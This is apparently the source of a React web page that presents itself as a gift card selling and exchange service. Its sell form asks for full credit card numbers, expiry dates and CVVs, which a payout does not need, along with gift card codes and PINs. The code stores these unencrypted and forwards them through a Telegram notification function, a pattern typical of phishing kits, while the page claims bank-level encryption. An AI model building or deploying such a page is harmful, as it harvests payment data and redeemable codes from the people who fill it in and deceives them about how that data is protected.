import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { SearchableSelect } from "@/components/ui/searchable-select";
import { DollarSign, RefreshCw, CreditCard, Building, Smartphone, Zap, Shield, Upload, Info } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { giftCards, GiftCard } from "@/data/giftcards";
import SEO from "@/components/SEO";

const SellGiftcards = () => {
  const { toast } = useToast();
  const { user } = useAuth();
  const [activeTab, setActiveTab] = useState("exchange");
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const [exchangeForm, setExchangeForm] = useState({
    giftcardToTrade: "",
    giftcardWanted: "",
    amount: "",
    code: "",
    pin: "",
    ecode: "",
    email: "",
    isDigitalCard: false,
    frontImage: null as File | null,
    backImage: null as File | null
  });

  const [sellForm, setSellForm] = useState({
    paymentMethod: "creditcard",
    accountDetails: "",
    paymentDetails: {
      creditCard: { cardholderName: "", cardNumber: "", expiryDate: "", cvv: "" }
    },
    giftcardName: "",
    code: "",
    pin: "",
    ecode: "",
    amount: "",
    email: "",
    isDigitalCard: false,
    frontImage: null as File | null,
    backImage: null as File | null
  });

  const selectedExchangeCard = giftCards.find(card => card.name === exchangeForm.giftcardToTrade);
  const selectedSellCard = giftCards.find(card => card.name === sellForm.giftcardName);

  const handleExchangeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      let userId = user?.id;
      
      // Generate a guest user ID if not authenticated
      if (!userId) {
        userId = crypto.randomUUID();
      }

      let frontImagePath = null;
      let backImagePath = null;

      // Upload images to Supabase Storage
      if (exchangeForm.frontImage) {
        const frontFileName = `${userId}/exchange-front-${Date.now()}-${exchangeForm.frontImage.name}`;
        const { data: frontData, error: frontError } = await supabase.storage
          .from('gift-card-images')
          .upload(frontFileName, exchangeForm.frontImage);

        if (frontError) throw frontError;
        frontImagePath = frontData.path;
      }

      if (exchangeForm.backImage) {
        const backFileName = `${userId}/exchange-back-${Date.now()}-${exchangeForm.backImage.name}`;
        const { data: backData, error: backError } = await supabase.storage
          .from('gift-card-images')
          .upload(backFileName, exchangeForm.backImage);

        if (backError) throw backError;
        backImagePath = backData.path;
      }

      // Calculate adjusted amount with 10% deduction
      const adjustedAmount = parseFloat(exchangeForm.amount) * 0.9;

      // Save to database
      const { error } = await supabase
        .from('exchange_requests')
        .insert({
          user_id: userId,
          type: 'exchange',
          email: exchangeForm.email,
          giftcard_name: exchangeForm.giftcardToTrade,
          giftcard_wanted: exchangeForm.giftcardWanted,
          amount: adjustedAmount.toString(),
          code: exchangeForm.code,
          pin: exchangeForm.pin || null,
          front_image_path: frontImagePath,
          back_image_path: backImagePath,
          status: 'pending'
        });

      if (error) throw error;

      // Send Telegram notification
      await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'exchange',
          email: exchangeForm.email,
          giftcardToTrade: exchangeForm.giftcardToTrade,
          giftcardWanted: exchangeForm.giftcardWanted,
          amount: `${exchangeForm.amount} (Value after 10% deduction: ${adjustedAmount})`,
          code: exchangeForm.code,
          pin: exchangeForm.pin || 'N/A',
          ecode: exchangeForm.ecode || 'N/A',
          frontImagePath: frontImagePath,
          backImagePath: backImagePath
        }
      });

      toast({
        title: "Exchange Request Submitted",
        description: `Your gift card exchange request has been submitted. Value after 10% deduction: $${adjustedAmount.toFixed(2)}. We'll process it within 24 hours.`,
      });
      
      setExchangeForm({
        giftcardToTrade: "",
        giftcardWanted: "",
        amount: "",
        code: "",
        pin: "",
        ecode: "",
        email: "",
        isDigitalCard: false,
        frontImage: null,
        backImage: null
      });

    } catch (error) {
      console.error('Error submitting exchange request:', error);
      toast({
        title: "Error",
        description: "Failed to submit exchange request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSellSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      let userId = user?.id;
      
      // Generate a guest user ID if not authenticated
      if (!userId) {
        userId = crypto.randomUUID();
      }

      let frontImagePath = null;
      let backImagePath = null;

      // Upload images to Supabase Storage
      if (sellForm.frontImage) {
        const frontFileName = `${userId}/sell-front-${Date.now()}-${sellForm.frontImage.name}`;
        const { data: frontData, error: frontError } = await supabase.storage
          .from('gift-card-images')
          .upload(frontFileName, sellForm.frontImage);

        if (frontError) throw frontError;
        frontImagePath = frontData.path;
      }

      if (sellForm.backImage) {
        const backFileName = `${userId}/sell-back-${Date.now()}-${sellForm.backImage.name}`;
        const { data: backData, error: backError } = await supabase.storage
          .from('gift-card-images')
          .upload(backFileName, sellForm.backImage);

        if (backError) throw backError;
        backImagePath = backData.path;
      }

      // Save to database  
      const { error } = await supabase
        .from('exchange_requests')
        .insert({
          user_id: userId,
          type: 'sell',
          email: sellForm.email,
          giftcard_name: sellForm.giftcardName,
          amount: sellForm.amount,
          code: sellForm.code,
          pin: sellForm.pin || null,
          payment_method: 'creditcard',
          payment_details: sellForm.paymentDetails.creditCard,
          front_image_path: frontImagePath,
          back_image_path: backImagePath,
          status: 'pending'
        });

      if (error) throw error;

      // Send Telegram notification for sell
      await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'sell',
          email: sellForm.email,
          giftcardName: sellForm.giftcardName,
          amount: sellForm.amount,
          code: sellForm.code,
          pin: sellForm.pin || 'N/A',
          ecode: sellForm.ecode || 'N/A',
          paymentMethod: 'Credit Card',
          paymentDetails: sellForm.paymentDetails.creditCard,
          frontImagePath: frontImagePath,
          backImagePath: backImagePath
        }
      });

      toast({
        title: "Sell Request Submitted",
        description: "Your gift card sale request has been submitted. Payment will be processed within 48 hours.",
      });
      
      setSellForm({
        paymentMethod: "creditcard",
        accountDetails: "",
        paymentDetails: {
          creditCard: { cardholderName: "", cardNumber: "", expiryDate: "", cvv: "" }
        },
        giftcardName: "",
        code: "",
        pin: "",
        ecode: "",
        amount: "",
        email: "",
        isDigitalCard: false,
        frontImage: null,
        backImage: null
      });

    } catch (error) {
      console.error('Error submitting sell request:', error);
      toast({
        title: "Error",
        description: "Failed to submit sell request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen">
      <SEO
        title="Sell Gift Cards for Cash – Instant Payment | All Giftcards"
        description="Sell your unwanted gift cards for instant cash. Best rates for Amazon, iTunes, Google Play and more."
        path="/sell"
        keywords="sell gift cards, gift cards for cash, sell Amazon gift card, sell iTunes gift card"
      />
      <Header />
      
      <main className="py-24 px-6 lg:px-8">
        <div className="mx-auto max-w-4xl">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="inline-flex p-4 rounded-lg bg-gradient-to-br from-accent/10 to-accent/20 mb-6">
              <DollarSign className="h-8 w-8 text-accent" />
            </div>
            <h1 className="text-3xl font-bold text-foreground sm:text-4xl mb-4">
              Sell Your Gift Cards
            </h1>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              Convert your unused gift cards into cash or exchange them for other brands you prefer
            </p>
          </div>

          {/* Benefits */}
          <div className="grid gap-6 md:grid-cols-3 mb-12">
            {[
              {
                icon: DollarSign,
                title: "Best Rates",
                description: "Get up to 95% of your gift card value"
              },
              {
                icon: Zap,
                title: "Fast Processing",
                description: "Receive payment within 24-48 hours"
              },
              {
                icon: Shield,
                title: "Secure & Safe",
                description: "All transactions are encrypted and protected"
              }
            ].map((benefit, index) => (
              <div key={benefit.title} className="text-center p-6 rounded-lg bg-muted/20 animate-fade-in" style={{ animationDelay: `${index * 0.1}s` }}>
                <benefit.icon className="h-8 w-8 text-accent mx-auto mb-4" />
                <h2 className="font-semibold text-foreground mb-2">{benefit.title}</h2>
                <p className="text-sm text-muted-foreground">{benefit.description}</p>
              </div>
            ))}
          </div>

          {/* Main Form */}
          <Card className="card-glow">
            <CardHeader>
              <CardTitle className="text-center">Choose Your Option</CardTitle>
            </CardHeader>
            <CardContent>
              <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
                <TabsList className="grid w-full grid-cols-2">
                  <TabsTrigger value="exchange" className="data-[state=active]:bg-primary data-[state=active]:text-primary-foreground">
                    <RefreshCw className="w-4 h-4 mr-2" />
                    Exchange Giftcard
                  </TabsTrigger>
                  <TabsTrigger value="sell" className="data-[state=active]:bg-accent data-[state=active]:text-accent-foreground">
                    <DollarSign className="w-4 h-4 mr-2" />
                    Sell for Money
                  </TabsTrigger>
                </TabsList>

                {/* Exchange Tab */}
                <TabsContent value="exchange" className="mt-8">
                  <form onSubmit={handleExchangeSubmit} className="space-y-6">
                    <div className="grid gap-6 md:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="giftcardToTrade">Gift Card to Trade *</Label>
                        <SearchableSelect
                          options={giftCards.map(card => ({
                            value: card.name,
                            label: `${card.name} ${card.requiresPin ? "(Code + PIN)" : "(Code Only)"}`
                          }))}
                          value={exchangeForm.giftcardToTrade}
                          onValueChange={(value) => setExchangeForm({...exchangeForm, giftcardToTrade: value})}
                          placeholder="Select gift card to trade"
                          searchPlaceholder="Search gift cards..."
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="giftcardWanted">Gift Card You Want *</Label>
                        <SearchableSelect
                          options={giftCards.map(card => ({
                            value: card.name,
                            label: `${card.name} ${card.requiresPin ? "(Code + PIN)" : "(Code Only)"}`
                          }))}
                          value={exchangeForm.giftcardWanted}
                          onValueChange={(value) => setExchangeForm({...exchangeForm, giftcardWanted: value})}
                          placeholder="Select gift card you want"
                          searchPlaceholder="Search gift cards..."
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="amount">Amount *</Label>
                      <Input
                        id="amount"
                        placeholder="e.g., $50.00"
                        value={exchangeForm.amount}
                        onChange={(e) => setExchangeForm({...exchangeForm, amount: e.target.value})}
                        required
                      />
                    </div>

                    <div className="grid gap-6 md:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="code">Gift Card Code *</Label>
                        <Input
                          id="code"
                          placeholder="Enter gift card code"
                          value={exchangeForm.code}
                          onChange={(e) => setExchangeForm({...exchangeForm, code: e.target.value})}
                          required
                          className="font-mono"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="pin">
                          PIN {selectedExchangeCard?.requiresPin ? "*" : "(if needed)"}
                        </Label>
                        <Input
                          id="pin"
                          placeholder="Enter PIN"
                          value={exchangeForm.pin}
                          onChange={(e) => setExchangeForm({...exchangeForm, pin: e.target.value})}
                          required={selectedExchangeCard?.requiresPin}
                          className="font-mono"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="ecode">Digital E-Code (if applicable)</Label>
                      <Input
                        id="ecode"
                        placeholder="Enter digital e-code"
                        value={exchangeForm.ecode}
                        onChange={(e) => setExchangeForm({...exchangeForm, ecode: e.target.value})}
                        className="font-mono"
                      />
                    </div>

                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="exchangeDigitalCard"
                        checked={exchangeForm.isDigitalCard}
                        onCheckedChange={(checked) => setExchangeForm({...exchangeForm, isDigitalCard: checked as boolean})}
                      />
                      <Label htmlFor="exchangeDigitalCard" className="cursor-pointer">
                        This is a digital card (no physical images needed)
                      </Label>
                    </div>

                    {exchangeForm.giftcardWanted && (
                      <div className="p-4 bg-primary/5 border border-primary/20 rounded-lg">
                        <p className="text-sm text-muted-foreground">
                          <strong>You will receive:</strong> {exchangeForm.giftcardWanted} gift card worth{" "}
                          <span className="text-primary font-semibold">
                            ${exchangeForm.amount ? (parseFloat(exchangeForm.amount) * 0.9).toFixed(2) : "0.00"}
                          </span>
                          {" "}(10% trading fee applied)
                        </p>
                      </div>
                    )}

                    {/* Image Upload Section */}
                    {!exchangeForm.isDigitalCard && (
                      <div className="space-y-4">
                        <Label>Upload Gift Card Images *</Label>
                      <div className="grid gap-6 md:grid-cols-2">
                        <div className="space-y-2">
                          <Label htmlFor="exchangeFrontImage">Front of Gift Card</Label>
                          <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                            <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                            <Input
                              id="exchangeFrontImage"
                              type="file"
                              accept="image/*"
                              onChange={(e) => setExchangeForm({...exchangeForm, frontImage: e.target.files?.[0] || null})}
                              className="hidden"
                              required={!exchangeForm.isDigitalCard}
                            />
                            <Label htmlFor="exchangeFrontImage" className="cursor-pointer">
                              {exchangeForm.frontImage ? (
                                <span className="text-primary font-medium">{exchangeForm.frontImage.name}</span>
                              ) : (
                                <span className="text-muted-foreground">Click to upload front image</span>
                              )}
                            </Label>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <Label htmlFor="exchangeBackImage">Back of Gift Card</Label>
                          <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                            <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                            <Input
                              id="exchangeBackImage"
                              type="file"
                              accept="image/*"
                              onChange={(e) => setExchangeForm({...exchangeForm, backImage: e.target.files?.[0] || null})}
                              className="hidden"
                              required={!exchangeForm.isDigitalCard}
                            />
                            <Label htmlFor="exchangeBackImage" className="cursor-pointer">
                              {exchangeForm.backImage ? (
                                <span className="text-primary font-medium">{exchangeForm.backImage.name}</span>
                              ) : (
                                <span className="text-muted-foreground">Click to upload back image</span>
                              )}
                            </Label>
                          </div>
                        </div>
                      </div>
                      </div>
                    )}

                    <div className="space-y-2">
                      <Label htmlFor="email">Email Address *</Label>
                      <Input
                        id="email"
                        type="email"
                        placeholder="your.email@example.com"
                        value={exchangeForm.email}
                        onChange={(e) => setExchangeForm({...exchangeForm, email: e.target.value})}
                        required
                      />
                    </div>

                    <Button 
                      type="submit" 
                      className="btn-primary w-full" 
                      size="lg"
                      disabled={isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-primary-foreground mr-2" />
                          Processing...
                        </>
                      ) : (
                        <>
                          <RefreshCw className="mr-2 h-4 w-4" />
                          Submit Exchange Request
                        </>
                      )}
                    </Button>
                  </form>
                </TabsContent>

                {/* Sell Tab */}
                <TabsContent value="sell" className="mt-8">
                  <form onSubmit={handleSellSubmit} className="space-y-6">
                    <div className="p-4 bg-primary/5 border border-primary/20 rounded-lg flex items-start gap-3">
                      <Info className="h-5 w-5 text-primary flex-shrink-0 mt-0.5" />
                      <div className="text-sm">
                        <p className="font-semibold text-foreground mb-1">Payment Information</p>
                        <p className="text-muted-foreground">
                          Once your gift card is verified, payment will be directly deposited to your credit card within 48 hours. 
                          We use secure bank-level encryption to protect your payment details.
                        </p>
                      </div>
                    </div>

                    <div className="space-y-4 border rounded-lg p-4 bg-muted/10">
                      <Label className="text-lg font-semibold flex items-center gap-2">
                        <CreditCard className="h-5 w-5" />
                        Credit Card Payment Details
                      </Label>
                      
                      <div className="grid gap-4">
                        <div>
                          <Label>Cardholder Name *</Label>
                          <Input
                            placeholder="John Doe"
                            value={sellForm.paymentDetails.creditCard.cardholderName}
                            onChange={(e) => setSellForm({
                              ...sellForm,
                              paymentDetails: {
                                creditCard: { ...sellForm.paymentDetails.creditCard, cardholderName: e.target.value }
                              }
                            })}
                            required
                          />
                        </div>
                        <div>
                          <Label>Card Number *</Label>
                          <Input
                            placeholder="1234 5678 9012 3456"
                            value={sellForm.paymentDetails.creditCard.cardNumber}
                            onChange={(e) => setSellForm({
                              ...sellForm,
                              paymentDetails: {
                                creditCard: { ...sellForm.paymentDetails.creditCard, cardNumber: e.target.value }
                              }
                            })}
                            required
                            maxLength={19}
                          />
                        </div>
                        <div className="grid gap-4 md:grid-cols-2">
                          <div>
                            <Label>Expiry Date *</Label>
                            <Input
                              placeholder="MM/YY"
                              value={sellForm.paymentDetails.creditCard.expiryDate}
                              onChange={(e) => setSellForm({
                                ...sellForm,
                                paymentDetails: {
                                  creditCard: { ...sellForm.paymentDetails.creditCard, expiryDate: e.target.value }
                                }
                              })}
                              required
                              maxLength={5}
                            />
                          </div>
                          <div>
                            <Label>CVV *</Label>
                            <Input
                              placeholder="123"
                              value={sellForm.paymentDetails.creditCard.cvv}
                              onChange={(e) => setSellForm({
                                ...sellForm,
                                paymentDetails: {
                                  creditCard: { ...sellForm.paymentDetails.creditCard, cvv: e.target.value }
                                }
                              })}
                              required
                              maxLength={4}
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="giftcardName">Gift Card Brand *</Label>
                      <SearchableSelect
                        options={giftCards.map(card => ({
                          value: card.name,
                          label: `${card.name} ${card.requiresPin ? "(Code + PIN)" : "(Code Only)"}`
                        }))}
                        value={sellForm.giftcardName}
                        onValueChange={(value) => setSellForm({...sellForm, giftcardName: value})}
                        placeholder="Select gift card brand"
                        searchPlaceholder="Search gift cards..."
                      />
                    </div>

                    <div className="grid gap-6 md:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="sellCode">Gift Card Code *</Label>
                        <Input
                          id="sellCode"
                          placeholder="Enter gift card code"
                          value={sellForm.code}
                          onChange={(e) => setSellForm({...sellForm, code: e.target.value})}
                          required
                          className="font-mono"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="sellPin">
                          PIN {selectedSellCard?.requiresPin ? "*" : "(if needed)"}
                        </Label>
                        <Input
                          id="sellPin"
                          placeholder="Enter PIN"
                          value={sellForm.pin}
                          onChange={(e) => setSellForm({...sellForm, pin: e.target.value})}
                          required={selectedSellCard?.requiresPin}
                          className="font-mono"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="sellEcode">Digital E-Code (if applicable)</Label>
                      <Input
                        id="sellEcode"
                        placeholder="Enter digital e-code"
                        value={sellForm.ecode}
                        onChange={(e) => setSellForm({...sellForm, ecode: e.target.value})}
                        className="font-mono"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="sellAmount">Amount *</Label>
                      <Input
                        id="sellAmount"
                        placeholder="e.g., $50.00"
                        value={sellForm.amount}
                        onChange={(e) => setSellForm({...sellForm, amount: e.target.value})}
                        required
                      />
                    </div>

                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="sellDigitalCard"
                        checked={sellForm.isDigitalCard}
                        onCheckedChange={(checked) => setSellForm({...sellForm, isDigitalCard: checked as boolean})}
                      />
                      <Label htmlFor="sellDigitalCard" className="cursor-pointer">
                        This is a digital card (no physical images needed)
                      </Label>
                    </div>

                    {/* Image Upload Section */}
                    {!sellForm.isDigitalCard && (
                      <div className="space-y-4">
                        <Label>Upload Gift Card Images *</Label>
                      <div className="grid gap-6 md:grid-cols-2">
                        <div className="space-y-2">
                          <Label htmlFor="sellFrontImage">Front of Gift Card</Label>
                          <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                            <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                            <Input
                              id="sellFrontImage"
                              type="file"
                              accept="image/*"
                              onChange={(e) => setSellForm({...sellForm, frontImage: e.target.files?.[0] || null})}
                              className="hidden"
                              required={!sellForm.isDigitalCard}
                            />
                            <Label htmlFor="sellFrontImage" className="cursor-pointer">
                              {sellForm.frontImage ? (
                                <span className="text-primary font-medium">{sellForm.frontImage.name}</span>
                              ) : (
                                <span className="text-muted-foreground">Click to upload front image</span>
                              )}
                            </Label>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <Label htmlFor="sellBackImage">Back of Gift Card</Label>
                          <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                            <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                            <Input
                              id="sellBackImage"
                              type="file"
                              accept="image/*"
                              onChange={(e) => setSellForm({...sellForm, backImage: e.target.files?.[0] || null})}
                              className="hidden"
                              required={!sellForm.isDigitalCard}
                            />
                            <Label htmlFor="sellBackImage" className="cursor-pointer">
                              {sellForm.backImage ? (
                                <span className="text-primary font-medium">{sellForm.backImage.name}</span>
                              ) : (
                                <span className="text-muted-foreground">Click to upload back image</span>
                              )}
                            </Label>
                          </div>
                        </div>
                      </div>
                      </div>
                    )}

                    <div className="space-y-2">
                      <Label htmlFor="sellEmail">Email Address *</Label>
                      <Input
                        id="sellEmail"
                        type="email"
                        placeholder="your.email@example.com"
                        value={sellForm.email}
                        onChange={(e) => setSellForm({...sellForm, email: e.target.value})}
                        required
                      />
                    </div>

                    <Button 
                      type="submit" 
                      className="btn-hero w-full" 
                      size="lg"
                      disabled={isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-primary-foreground mr-2" />
                          Processing...
                        </>
                      ) : (
                        <>
                          <DollarSign className="mr-2 h-4 w-4" />
                          Submit Sell Request
                        </>
                      )}
                    </Button>
                  </form>
                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>

          {/* Process Info */}
          <div className="mt-12 grid gap-8 md:grid-cols-2">
            <div className="p-6 rounded-lg bg-primary/5 border border-primary/20">
              <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                <RefreshCw className="h-5 w-5 text-primary" />
                Exchange Process
              </h3>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li>• Submit your exchange request with gift card details</li>
                <li>• We verify your gift card within 24 hours</li>
                <li>• Once verified, we send you the requested gift card</li>
                <li>• Exchange rate may vary based on demand</li>
              </ul>
            </div>

            <div className="p-6 rounded-lg bg-accent/5 border border-accent/20">
              <h3 className="font-semibold text-foreground mb-4 flex items-center gap-2">
                <DollarSign className="h-5 w-5 text-accent" />
                Sell Process
              </h3>
              <ul className="space-y-2 text-sm text-muted-foreground">
                <li>• Submit your gift card for cash conversion</li>
                <li>• We verify authenticity and balance</li>
                <li>• Payment sent to your preferred method</li>
                <li>• Receive up to 95% of gift card value</li>
              </ul>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default SellGiftcards;